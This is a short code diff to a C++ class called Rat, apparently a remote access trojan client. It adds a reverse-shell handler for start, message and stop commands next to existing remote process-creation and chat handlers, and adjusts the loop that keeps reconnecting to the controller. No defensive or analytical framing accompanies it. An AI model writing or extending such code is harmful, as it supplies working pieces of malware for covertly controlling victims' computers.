@@ -2,6 +2,7 @@
 
 #include "ChatHandler.h"
 #include "CreateProcessHandler.h"
+#include "ReverseShellHandler.h"
 #include "Trace.h"
 
 Rat::Rat(
@@ -20,11 +21,15 @@ Rat::Rat(
 {
 	_handlers[MessageType::Chat] = std::make_shared<ChatHandler>();
 	_handlers[MessageType::CreateProcessS] = std::make_shared<CreateProcessHandler>();
+	auto reverseShellHandler = std::make_shared<ReverseShellHandler>(_sender.get());
+	_handlers[MessageType::StartReverseShell] = reverseShellHandler;
+	_handlers[MessageType::ReverseShellMessage] = reverseShellHandler;
+	_handlers[MessageType::StopReverseShell] = reverseShellHandler;
 }
 
 void Rat::OnMessage(MessageType type, std::span<char> content)
 {
-	_handlers[type]->Handle(content);
+	_handlers[type]->Handle(type, content);
 }
 
 void Rat::OnDisconnection()
@@ -36,6 +41,7 @@ void Rat::OnDisconnection()
 	{
 		try
 		{
+			_connection.reset();
 			_connection = _client->Connect();
 			connected = true;
 		}
